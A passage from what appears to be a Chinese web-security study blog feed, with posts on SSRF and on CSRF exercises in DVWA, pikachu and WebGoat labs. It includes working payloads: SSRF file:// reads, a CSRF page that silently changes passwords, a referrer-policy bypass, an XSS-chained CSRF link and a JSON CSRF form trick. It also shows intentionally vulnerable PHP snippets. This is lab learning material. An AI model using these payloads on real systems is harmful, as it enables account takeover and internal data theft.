class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;pre&gt;<span class="hljs-subst">&#123;$cmd&#125;</span>&lt;/pre&gt;&quot;</span>;<br>&#125;<br><br><span class="hljs-meta">?&gt;</span> <br></code></pre></div></td></tr></table></figure><p>可以看出存在OS命令执行漏洞的原因是使用了shell_exec函数，并且服务端没有对用户输入进行过滤。</p><hr><p>参考：</p><p>《web安全攻防》</p><p>《Web安全深度剖析》</p><hr><p>完结 : )🐣</p>]]></content>
    
    
    <categories>
      
      <category>学习</category>
      
      <category>网安</category>
      
    </categories>
    
    
    <tags>
      
      <tag>命令执行</tag>
      
      <tag>Web安全</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>ssrf学习笔记+例题</title>
    <link href="/2022/03/20/ssrf%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0+%E4%BE%8B%E9%A2%98/"/>
    <url>/2022/03/20/ssrf%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0+%E4%BE%8B%E9%A2%98/</url>
    
    <content type="html"><![CDATA[<p>SSRF（Server-Side Request Forgery，服务器端请求伪造）是一种由攻击者构造请求，由服务器发起请求的安全漏洞。一般情况下，SSRF攻击的目标是外网无法访问的内部服务系统（正因为请求是由服务器端发起的，所以服务端能请求到与自身相连而与外网隔离的内部服务系统）</p><span id="more"></span><hr><h3 id="ssrf漏洞原理"><a href="#ssrf漏洞原理" class="headerlink" title="ssrf漏洞原理"></a>ssrf漏洞原理</h3><p>其形成的原因大都是由于服务端<strong>提供了从其他服务器应用获取数据的功能</strong>,但又没有对目标地址做严格过滤与限制。例如，黑客可以操作服务端从指定URL地址获取网页文本内容，加载指定地址的图片等，利用的是服务端的请求伪造。SSRF利用存在缺陷的web应用作为代理攻击远程和本地的服务器。</p><p>主要攻击方式如下所示</p><ul><li>对外网、服务器所在内网、本地进行端口扫描，获取一些服务的banner信息。</li><li>攻击运行在内网或本地的应用程序。</li><li>对内网web应用进行指纹识别，识别企业内部的资产信息。</li><li>攻击内外网的web应用，主要是使用http get请求就可以实现的攻击（比如说struts2、SQli等）。</li><li>利用file协议读取本地</li></ul><p><em>banner信息：属于信息搜集的范畴。在渗透测试中，典型的 4xx、5xx 信息泄露就属于 banner 泄露的一种。在 banner 信息中，可以获取到软件开发商、软件名称、服务类型、版本版本号有时候就会存在公开的 CVE 问题，可以直接进行利用。banner 信息获取的基础是在和目标建立链接后的，只有建立的链接，才可以获取到相应的 banner 信息，当目标对 banner 信息进行隐藏或者配置了禁止读取时，这时的 banner 则获取不到</em></p><p><img src="https://gitee.com/manyeggs/drawing-bed-picgo/raw/master/images/ssrf01.jpg"></p><hr><h3 id="ssrf漏洞利用"><a href="#ssrf漏洞利用" class="headerlink" title="ssrf漏洞利用"></a>ssrf漏洞利用</h3><p>以pikachu的ssrf例题为例</p><p>此php页面的功能是接收一个url参数，然后将url的内容返回到网上。</p><p><img src="https://gitee.com/manyeggs/drawing-bed-picgo/raw/master/images/20220322190647.png"></p><p>如果我们的url参数设为服务器上其它文件的地址（内网地址）时，页面同样返回请求内容，泄露了内网信息。</p><p><img src="https://gitee.com/manyeggs/drawing-bed-picgo/raw/master/images/20220322191052.png"></p><p>也可以利用file协议读取文件，如<code>xx.php?url=file:///C:/Windows/win.ini</code></p><hr><h3 id="ssrf漏洞代码分析"><a href="#ssrf漏洞代码分析" class="headerlink" title="ssrf漏洞代码分析"></a>ssrf漏洞代码分析</h3><figure class="highlight php"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br>    <span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;url&#x27;</span>]))<br>    &#123;<br>        <span class="hljs-variable">$file</span> = file_get_contents(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;url&#x27;</span>]);<br>        <span class="hljs-keyword">echo</span> <span class="hljs-variable">$file</span>;<br>    &#125;<br><span class="hljs-meta">?&gt;</span><br></code></pre></div></td></tr></table></figure><p>在这段代码中，<code>file_get_contents()</code>将整个文件或一个url所指向的文件读入一个字符串中，接着输出到页面上。</p><p>其它可能导致ssrf的函数有：</p><figure class="highlight stylus"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs stylus"><span class="hljs-function"><span class="hljs-title">fsockopen</span><span class="hljs-params">()</span></span>  打开一个网络连接或者一个Unix 套接字连接<br><span class="hljs-function"><span class="hljs-title">curl_exec</span><span class="hljs-params">()</span></span>   初始化一个新的会话<br></code></pre></div></td></tr></table></figure><p>介绍一下curl是什么东西。</p><p><img src="https://gitee.com/manyeggs/drawing-bed-picgo/raw/master/images/20220322221733.png"></p><p>官网上说了curl是一个工具和库</p><ul><li><p>作为一种命令行工具，作用是发出网络请求，然后得到和提取数据，显示在”标准输出”（stdout）上面。</p><p>它支持多种协议，可用于网站开发。</p></li><li><p>作为一种库，curl库是一个非常强大的开源库，支持很多协议，包括HTTP、FTP、TELNET等，在微信开发、支付、第三方登录中，开发人员使用它来发送请求。它给人们带来的好处是可以通过灵活的选项设置不同的HTTP协议参数，并且支持HTTPS，也经常用于数据采集当中。</p></li></ul><p>在php里面curl作为一个库被加载，以下面这个为例，我们重点关注一下ssrf中用到的curl函数</p><figure class="highlight php"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br>    <br>    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">show_header</span>(<span class="hljs-params"><span class="hljs-variable">$url</span></span>)</span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-variable">$ch</span> = curl_init();<br>    curl_setopt(<span class="hljs-variable">$ch</span>,CURLOPT_URL,<span class="hljs-variable">$url</span>);<br>    curl_setopt(<span class="hljs-variable">$ch</span>,CURLOPT_HEADER,<span class="hljs-number">0</span>);<br>    curl_exec(<span class="hljs-variable">$ch</span>);<br>    curl_close(<span class="hljs-variable">$ch</span>);<br>&#125;<br><br><span class="hljs-variable">$url</span>=<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;url&#x27;</span>];<br>show_header(<span class="hljs-variable">$url</span>);<br><span class="hljs-meta">?&gt;</span><br>    <br><span class="hljs-comment">//curl_init($ch)，创建一个新的curl资源</span><br><span class="hljs-comment">//curl_setopt($ch,CURLOPT_URL,$url), 设置需要获取的url地址</span><br><span class="hljs-comment">//curl_setopt($ch,CURLOPT_HEADER,0)，启用时（即后面的curl_exec()函数）会将头文件的信息作为数据</span><br><span class="hljs-comment">//流输出。</span><br><span class="hljs-comment">//curl_exec($ch)，执行一个curl会话，即抓取URL并把它传递给浏览器，请求的内容取决于之</span><br><span class="hljs-comment">//前curl_setopt()函数执行的内容。在这里即为输出头文件信息。</span><br><br><span class="hljs-comment">//根据这段代码，如果我们输入内网服务器地址，会访问该页面并得到对应的文件头信息。所以我们可以通过这种方式获</span><br><span class="hljs-comment">//取内网中一些敏感信息，如可通过banner得知该主机是否存在某种服务。</span><br></code></pre></div></td></tr></table></figure><hr><h3 id="ssrf相关例题"><a href="#ssrf相关例题" class="headerlink" title="ssrf相关例题"></a>ssrf相关例题</h3><p>题目来源：webGoat–A8 Server-Side Request Forgery</p><p><img src="https://gitee.com/manyeggs/drawing-bed-picgo/raw/master/images/20220323130332.png"></p><p>当我们点击提交按钮时，弹出tom的图片。而上方文字提升我们需要改变url显示出jerry的图片。</p><p>从形式上猜测该处为post表单，接收的url值指向了tom。</p><p>我们可以通过抓包或者直接修改前端页面中post请求的url参数来展示Jerry照片</p><p><img src="https://gitee.com/manyeggs/drawing-bed-picgo/raw/master/images/20220323130255.png"></p><p>而第二关，同样是在form表单中的post请求里修改url参数的值即可，在这里需修改为<code>http://ifconfig.pro</code></p><p><img src="https://gitee.com/manyeggs/drawing-bed-picgo/raw/master/images/20220323131001.png"></p><hr><p>参考：《web安全攻防》</p><hr><p>完结 : )🐣</p>]]></content>
    
    
    <categories>
      
      <category>学习</category>
      
      <category>网安</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Web安全</tag>
      
      <tag>ssrf</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>csrf靶场练习</title>
    <link href="/2022/03/16/csrf%E9%9D%B6%E5%9C%BA%E7%BB%83%E4%B9%A0/"/>
    <url>/2022/03/16/csrf%E9%9D%B6%E5%9C%BA%E7%BB%83%E4%B9%A0/</url>
    
    <content type="html"><![CDATA[<p>本篇介绍一下我从各大靶场（dvwa、pikachu、webgoat）中选出的几个具有csrf漏洞的例题。</p><span id="more"></span><p>关于csrf基础知识的传送门：[csrf的基础知识](<a href="https://eggswoo.com/2022/03/13/csrf%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/">csrf学习笔记 - 蛋窝窝 (eggswoo.com)</a>)</p><hr><h3 id="referer限制"><a href="#referer限制" class="headerlink" title="referer限制"></a>referer限制</h3><p>题目来源：dvwa–csrf medium级别（区别于网上的老旧版本，这关涉及到了浏览器安全策略）</p><p>相关源码：</p><figure class="highlight php"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><br><span class="hljs-keyword">if</span>( <span class="hljs-keyword">isset</span>( <span class="hljs-variable">$_GET</span>[ <span class="hljs-string">&#x27;Change&#x27;</span> ] ) ) &#123;<br>    <span class="hljs-comment">// Checks to see where the request came from</span><br>    <span class="hljs-keyword">if</span>( stripos( <span class="hljs-variable">$_SERVER</span>[ <span class="hljs-string">&#x27;HTTP_REFERER&#x27;</span> ] ,<span class="hljs-variable">$_SERVER</span>[ <span class="hljs-string">&#x27;SERVER_NAME&#x27;</span> ]) !== <span class="hljs-literal">false</span> ) &#123;<br>        <span class="hljs-comment">// Get input</span><br>        <span class="hljs-variable">$pass_new</span>  = <span class="hljs-variable">$_GET</span>[ <span class="hljs-string">&#x27;password_new&#x27;</span> ];<br>        <span class="hljs-variable">$pass_conf</span> = <span class="hljs-variable">$_GET</span>[ <span class="hljs-string">&#x27;password_conf&#x27;</span> ];<br><br>...<br>...<br>...<br><br><span class="hljs-meta">?&gt;</span><br></code></pre></div></td></tr></table></figure><p>可以看出这关服务器对数据包中的参数<code>$_SERVER[ &#39;HTTP_REFERER&#39; ]</code>进行了检查，该参数必须在函数<code>stripos()</code>中与<code>$_SERVER[ &#39;SERVER_NAME&#39; ]</code>的结果为true,代码中的这两个参数在http数据包中即为<code>host</code>和<code>referer</code>。host指的是目标服务器域名，referer指的是当前服务器域名。以下图为的数据包为例</p><p>当我从百度的搜索页面跳转到知乎的页面时，就会产生一个这样的数据包：</p><p>host:        www.baidu.com</p><p>referer:    www.zhihu.com</p><p><img src="https://gitee.com/manyeggs/drawing-bed-picgo/raw/master/images/20220317165448.png"></p><p>在这里我们的目的是要满足 stripos( $_SERVER[ ‘HTTP_REFERER’ ] ,$_SERVER[ ‘SERVER_NAME’ ]) !== false ，而stripos（）函数的作用是查找字符串在另一字符串中第一次出现的位置。这里即需要referer的域名在host中出现。这里本意是确保是站内的跳转，referer和host都必须是同一个站点下。</p><p>而我们可以在自己的服务器上部署一个文件名为目标站点的HTML文件，这样当用户访问我们站点上的文件时，host为目标站点，referer为我们站点/目标站点.html，满足了stripos函数，理论上来说即可成功实现csrf攻击。</p><p><strong>但是</strong>，我最开始实验的时候一直没能成功，referer中始终只有一级域名,即只有一个ip地址，没有显示后面的文件名，查阅资料后才发现这是因为浏览器有着一些安全策略的设置。</p><p><img src="https://gitee.com/manyeggs/drawing-bed-picgo/raw/master/images/20220317184605.png"></p><p><em>图片来源：<a href="https://www.jianshu.com/p/f76917e4947e">https://www.jianshu.com/p/f76917e4947e</a></em></p><p>可我之前在百度跳转知乎时也是不同源，但数据包中的referer却是完整的。</p><p>原来这是因为有关referer参数的设置可以在html网页中更改，这样就浏览器的安全策略就失效了。</p><p>这是之前百度搜索页面的相关设置</p><p><img src="https://gitee.com/manyeggs/drawing-bed-picgo/raw/master/images/20220317190110.png">所以我们需要在自己构造的html页面中加入这一项<code>&lt;meta content=&quot;always&quot; name=&quot;referrer&quot;&gt;</code></p><p>该html文件源码：</p><figure class="highlight html"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs html">//服务器为192.168.111.130<br>//该文件储存在本地（127.0.0.1），文件名为192.168.111.130.html<br><span class="hljs-meta">&lt;!doctype <span class="hljs-meta-keyword">html</span>&gt;</span><br><span class="hljs-meta">&lt;!doctype <span class="hljs-meta-keyword">html</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">html</span> <span class="hljs-attr">lang</span>=<span class="hljs-string">&quot;en&quot;</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">head</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">meta</span> <span class="hljs-attr">content</span>=<span class="hljs-string">&quot;always&quot;</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;referrer&quot;</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">meta</span> <span class="hljs-attr">charset</span>=<span class="hljs-string">&quot;UTF-8&quot;</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">title</span>&gt;</span>img_src_get<span class="hljs-tag">&lt;/<span class="hljs-name">title</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">head</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">body</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">h1</span>&gt;</span>get for img src<span class="hljs-tag">&lt;/<span class="hljs-name">h1</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">img</span> <span class="hljs-attr">stytle</span>=<span class="hljs-string">&quot;display:none&quot;</span> <span class="hljs-attr">src</span>=<span class="hljs-string">&quot;http://192.168.111.130/DVWA-master/vulnerabilities/csrf/?password_new=a&amp;password_conf=a&amp;Change=Change&quot;</span><span class="hljs-attr">alt</span>=<span class="hljs-string">&quot;&quot;</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">body</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">html</span>&gt;</span><br></code></pre></div></td></tr></table></figure><p>再次尝试访问</p><p>referer带有了我们命名的文件名，实现了当用户访问我们服务器上的这个页面时，会对目标服务器上的页面发起csrf攻击。</p><p><img src="https://gitee.com/manyeggs/drawing-bed-picgo/raw/master/images/20220317190505.png"></p><p>验证一下密码，已成功被修改为数据包的参数“1”，这次csrf攻击成功。</p><p><img src="https://gitee.com/manyeggs/drawing-bed-picgo/raw/master/images/20220317191704.png"></p><p><em>题外话，做这一关的实验时，我并没有直接在网上看到解决方法，包括我用英文搜的Google在内，所有的通关方法都是不用改html参数就成功了，所以我也卡了有一两天。如果按部就班，盲目跟着别人的步子，只会在这里卡到天荒地老🤔。</em></p><p>另外这一关的官方提示，是说我们可以结合xss来完成。</p><p><img src="https://gitee.com/manyeggs/drawing-bed-picgo/raw/master/images/20220317203005.png"></p><p>因为如果站内存在xss漏洞，利用站内的xss漏洞发送GET请求的话，产生的数据包中host和referer也满足在同一个域名这一条件。</p><p>medium难度下的反射型xss的payload:</p><p><code>&lt;img src=1 onerror=alert(1)&gt;</code></p><p>我们根据要求更改一下payload：</p><p><code>&lt;img src=&quot;http://192.168.111.130/DVWA-master/vulnerabilities/csrf/?password_new=&amp;password_conf=&amp;Change=Change#&quot; alt=&quot;over&quot;&gt;</code></p><p><em>xss叫跨站脚本攻击，而非跨站js脚本攻击</em> :)</p><p>结合url生成链接：</p><p><code>http://192.168.111.130/DVWA-master/vulnerabilities/xss_r/?name=%3Cimg+src%3D%22http%3A%2F%2F192.168.111.130%2FDVWA-master%2Fvulnerabilities%2Fcsrf%2F%3Fpassword_new%3D%26password_conf%3D%26Change%3DChange%23%22+alt%3D%22over%22%3E#</code></p><p>当用户点击该链接时，即会触发xss漏洞，接着触发csrf漏洞，最终达到更改密码的目的。当然，我们同样可以将该链接藏在我们服务器上的站点中，一个短链接更容易使用户受骗点击。</p><hr><h3 id="token限制"><a href="#token限制" class="headerlink" title="token限制"></a>token限制</h3><p>题目来源：pikachu–csrf(token)/dvwa–high</p><p>这两个题目都是在请求的URL中加入了token验证，以dvwa提供的源码为例</p><figure class="highlight php"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><br><span class="hljs-keyword">if</span>( <span class="hljs-keyword">isset</span>( <span class="hljs-variable">$_GET</span>[ <span class="hljs-string">&#x27;Change&#x27;</span> ] ) )<br>&#123;<br>    <span class="hljs-comment">// Check Anti-CSRF token</span><br>    checkToken( <span class="hljs-variable">$_REQUEST</span>[ <span class="hljs-string">&#x27;user_token&#x27;</span> ], <span class="hljs-variable">$_SESSION</span>[ <span class="hljs-string">&#x27;session_token&#x27;</span> ], <span class="hljs-string">&#x27;index.php&#x27;</span> );<br><br>    ...<br>    ...<br>    ...<br><span class="hljs-comment">// Generate Anti-CSRF token</span><br>generateSessionToken();<br>&#125;<br><span class="hljs-meta">?&gt;</span><br></code></pre></div></td></tr></table></figure><p>前端form表单中有关token的相关代码</p><figure class="highlight html"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">form</span> <span class="hljs-attr">action</span>=<span class="hljs-string">&quot;#&quot;</span> <span class="hljs-attr">method</span>=<span class="hljs-string">&quot;GET&quot;</span>&gt;</span><br>Current password:<span class="hljs-tag">&lt;<span class="hljs-name">br</span> /&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;password&quot;</span> <span class="hljs-attr">AUTOCOMPLETE</span>=<span class="hljs-string">&quot;off&quot;</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;password_current&quot;</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">br</span> /&gt;</span><br>New password:<span class="hljs-tag">&lt;<span class="hljs-name">br</span> /&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;password&quot;</span> <span class="hljs-attr">AUTOCOMPLETE</span>=<span class="hljs-string">&quot;off&quot;</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;password_new&quot;</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">br</span> /&gt;</span><br>Confirm new password:<span class="hljs-tag">&lt;<span class="hljs-name">br</span> /&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;password&quot;</span> <span class="hljs-attr">AUTOCOMPLETE</span>=<span class="hljs-string">&quot;off&quot;</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;password_conf&quot;</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">br</span> /&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">br</span> /&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;submit&quot;</span> <span class="hljs-attr">value</span>=<span class="hljs-string">&quot;Change&quot;</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;Change&quot;</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&#x27;hidden&#x27;</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&#x27;user_token&#x27;</span> <span class="hljs-attr">value</span>=<span class="hljs-string">&#x27;53d5d775f61cd91ce1056a8af93bd825&#x27;</span> /&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">form</span>&gt;</span><br></code></pre></div></td></tr></table></figure><p>用户每次访问/请求页面，就会调用generateSessionToken()函数，销毁之前储存在$_SESSION中的token，并在<strong>服务器端</strong>生成$_SESSION[‘token’]，并将这个$_SESSION[‘token’]传递到<strong>当前用户的前端表单</strong>中。当用户提交表单时，会一并提交这个token的值，服务器接收到用户请求时会先验证token的值是否与服务器端生成的token相同，如果不同则拒绝提供服务。</p><p>这样当攻击者进行csrf攻击时，所构造的payload中必须带有正确的token，而token全程是在服务端生成，传递到用户的前端，用后即毁。攻击者作为第三者是没有机会窃取到token的，所以携带token的请求几乎已经堵死了csrf漏洞。</p><p>为什么只是几乎呢，我通过查阅针对携带token请求的绕过，目前只在网上看到了这两种不是非常靠谱的方法</p><ul><li><p>先连续获取几次token的值，这个值一般是通过base64或md5加密。尝试解密并推导出token的生成函数，这样就有机会伪造token了</p><p><em>（如果是随机生成的token就没必要猜了…）</em></p></li><li><p>直接删除token，有些请求是不需要token的，比如删除用户账户</p><p><em>（所以这也不算绕过token）</em></p><p><img src="https://gitee.com/manyeggs/drawing-bed-picgo/raw/master/images/20220325000535.png"></p></li></ul><p><strong>普遍能够绕过token的方法是结合xss漏洞来实现csrf。</strong>当用户点击攻击者构造的链接后，触发通过xss读取用户前端页面的token。而我们之前提到过的，攻击者在自己的服务器上构建js代码，构造xss链接来指向该js文件在这里是不行的了<a href="https://eggswoo.com/2022/03/05/xss%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/#xss%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8%E8%BF%87%E7%A8%8B">xss学习笔记 - 蛋窝窝 (eggswoo.com)</a>，因为存在着跨域的限制。简单来说就是网站如没有允许跨域的话，是不能被其它网站读取数据的。攻击者的网站攻击者可以取消跨域的限制，让别的网站来读取攻击者的js脚本，而攻击者却不能更改目标站点的跨域限制，也就是说攻击者网站上的js文件是不能读取站点上前端的html内容的。所以攻击者只能用xss漏洞直接读取token内容。</p><p>下面是我看到的一种思路：</p><p><a href="https://www.freebuf.com/articles/web/203301.html">DVWA 1.10 High等级的CSRF另类通关法 - FreeBuf网络安全行业门户</a></p><p>结合以上内容可以看出来，即使有绕过带有token的csrf的方法也具存在着很强的局限性，况且实际情况下利用xss直接窃取cookie来登录还要更简单一些</p><hr><h3 id="带有json格式的POST请求伪造"><a href="#带有json格式的POST请求伪造" class="headerlink" title="带有json格式的POST请求伪造"></a>带有json格式的POST请求伪造</h3><p>题目来源：WebGoat–A8 CSRF and content-type</p><p>这道题的特点是使用了json数据格式来传递表单中的数据。</p><p><img src="https://gitee.com/manyeggs/drawing-bed-picgo/raw/master/images/20220322160527.png"></p><p>当我们提交后，<strong>我们输入的值会被解析为json格式</strong>提交：</p><p><img src="https://gitee.com/manyeggs/drawing-bed-picgo/raw/master/images/20220322163851.png"></p><p>然后服务器再解析json格式的内容，做出对应的响应。</p><p>我们的目的就是伪造这个表单，放在自己服务器上诱使用户点击（或是直接构造提交请求的链接）。现在的任务就是如何伪造这种json格式的表单。</p><p>靶场中给了一个<strong>带有XML主体的post请求</strong>参考资料<a href="http://pentestmonkey.net/blog/csrf-xml-post-request">csrf-xml-post-request</a>。（xml格式和json格式都是用于接收web服务端数据的一种格式，这两种格式的post绕过方法是一样的）。从这里的资料可知，如果使用这两种格式接收数据，fom中必须添加属性<code>ENCTYPE=&quot;text/plain&quot;</code>。</p><p>除了编码外，还有另外一个问题。</p><p>浏览器解析post内容的默认格式是这样的：a=1&amp;b=2&amp;c=3。而json格式数据是这样的：{“a”:1,”b”:2,”c”:3}</p><p>post中传递参数时，按照规定会是这样的形式：<code>name1=value&amp;name2=value2</code>。这在input标签中看起来是这个样子:</p><figure class="highlight html"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;hidden&quot;</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;a&quot;</span> <span class="hljs-attr">value</span>=<span class="hljs-string">&quot;b&quot;</span> &gt;</span>//a=b<br></code></pre></div></td></tr></table></figure><p>而我们构造出的链接在传递json数据时，input标签中的内容是这样：</p><figure class="highlight html"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;hidden&quot;</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&#x27;&#123;json内容&#125;&#x27;</span>&gt;</span>  //json（=xx?）<br></code></pre></div></td></tr></table></figure><p>漏掉了value属性。所以即使我们构造成这样，在提交表单时浏览器会”智能地“加上一个等号，使得我们提交的数据变成<code>&#123;json内容&#125;=</code>。而这多余的等号会使得服务器解析json的内容失败，我们构造的链接也就是无效的。</p><p><img src="https://gitee.com/manyeggs/drawing-bed-picgo/raw/master/images/20220322171156.png"></p><p><em>图片来源：<a href="https://www.jianshu.com/p/227ebb46c1a7">https://www.jianshu.com/p/227ebb46c1a7</a></em></p><p>所以这里的json需要和input的属性value拼接一下，凑出<code>value=</code></p><figure class="highlight html"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&#x27;&#123;&quot;name&quot;:&quot;WebGoat&quot;,&quot;email&quot;:&quot;webgoat@webgoat.org&quot;,&quot;subject&quot;:&quot;suggestions&quot;,&quot;message&quot;:&quot;&#x27;</span> <span class="hljs-attr">value</span>=<span class="hljs-string">&#x27;WebGoat is the best!!&quot;&#125;&#x27;</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&#x27;hidden&#x27;</span>&gt;</span><br><br></code></pre></div></td></tr></table></figure><p>这样构造满足了name=value的形式，而post传递的数据被浏览器解析为</p><p><img src="https://gitee.com/manyeggs/drawing-bed-picgo/raw/master/images/20220322172458.png"></p><p><em>图片来源：<a href="https://www.jianshu.com/p/227ebb46c1a7">https://www.jianshu.com/p/227ebb46c1a7</a></em></p><p>服务器就能正确解析出该json信息，（只是最后一项中会多出一个=号）。</p><p>这样当受害者点击我们构造的链接时，服务器就会收到带有json格式的post请求并相响应，我们的目的也就达到了。</p><hr><h3 id="登录csrf"><a href="#登录csrf" class="headerlink" title="登录csrf"></a>登录csrf</h3><p>题目来源：W531ebGoat–Login CSRF attack</p><p>这种csrf攻击是让用户在不知情的情况下登录到了攻击者的账户，然后攻击者就可以知道用户做了什么操作，用这种方式来搜集用户的信息。</p><p><img src="https://gitee.com/manyeggs/drawing-bed-picgo/raw/master/images/20220321201446.png"></p><p>以图上的内容为例，攻击者在自己服务器上创建一个页面（www.attacker.com），页面中有一个登录谷歌的表单，当用户访问该页面时就会自动登录谷歌，浏览器就保存了登录谷歌的cookie。然后当用户使用谷歌时，浏览器直接使用攻击者的Cookie，用户会一直以攻击者的账户请求谷歌的服务。事后攻击者再登录自己的账户根据历史记录就能看到用户搜索了什么内容。</p><hr><p>完结 : )🐣</p>]]></content>
    
    
    <categories>
      
      <category>学习</category>
      
      <category>网安</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Web安全</tag>
      
      <tag>csrf</tag>
      
    </tags>
    
